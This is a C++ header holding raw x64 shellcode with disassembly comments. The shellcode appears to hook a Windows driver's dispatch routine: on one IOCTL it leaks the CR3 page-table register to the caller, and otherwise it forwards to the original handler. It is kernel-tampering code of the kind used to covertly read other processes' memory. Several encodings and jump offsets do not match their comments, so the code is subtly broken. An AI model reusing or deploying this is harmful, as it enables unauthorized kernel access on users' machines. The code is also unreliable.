#pragma once

namespace shellcode
{
	static const uint8_t data[] = {
	0x48, 0x83, 0xEC, 0x28, 				 // 0x0: sub rsp, 0x28
	0x48, 0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00, 	 // 0x4: mov rax, [rdx+0xB8] 
	0x49, 0x89, 0xD0, 					 // 0xB: mov r8, rdx
	0x81, 0x78, 0x18, 0x0B, 0x20, 0x00, 0x80, 	 // 0xE: cmp dword [rax+18h], 8000200Bh
	0x75, 0x2B, 						 // 0x15: jnz 0x2D
	0x48, 0x8B, 0x50, 0x20, 				 // 0x17: mov rdx, [rax+0x20]
	0x48, 0x85, 0xD2, 					 // 0x1B: test rdx, rdx
	0x74, 0x1C, 						 // 0x1E: jz 0x1E
	0x0F, 0x20, 0xD8, 					 // 0x20: mov rax, cr3
	0x48, 0x89, 0x02, 					 // 0x23: mov [rdx], rax
	0x4C, 0x89, 0xC1, 					 // 0x26: mov rcx, r8
	0x49, 0x83, 0x60, 0x38, 0x00, 			 // 0x29: and qword [r8+0x38], 0
	0x31, 0xD2, 						 // 0x2E: xor edx, edx
	0x41, 0x83, 0x60, 0x30, 0x00, 			 // 0x30: and dword [r8+0x30], 0
	0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,	 // 0x35: mov rax, 0xFFFFFFFFFFFFFFFF; IofCompleteRequest
	0xFF, 0xD0, 						 // 0x3C: call rax
	0x48, 0x31, 0xC0, 					 // 0x3E: xor rax, rax
	0x48, 0x83, 0xC4, 0x28, 				 // 0x41: add rsp, 0x28
	0xC3, 								 // 0x45: retn
	0x4C, 0x89, 0xC2, 					 // 0x46: mov rdx, r8
	0x48, 0x83, 0xC4, 0x28, 				 // 0x49: add rsp, 28h
	0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 	 // 0x4D: mov rax, 0xFFFFFFFFFFFFFFFF ; OriginalDispatch
	0xFF, 0xE0, 						 // 0x54: jmp rax
	};
}
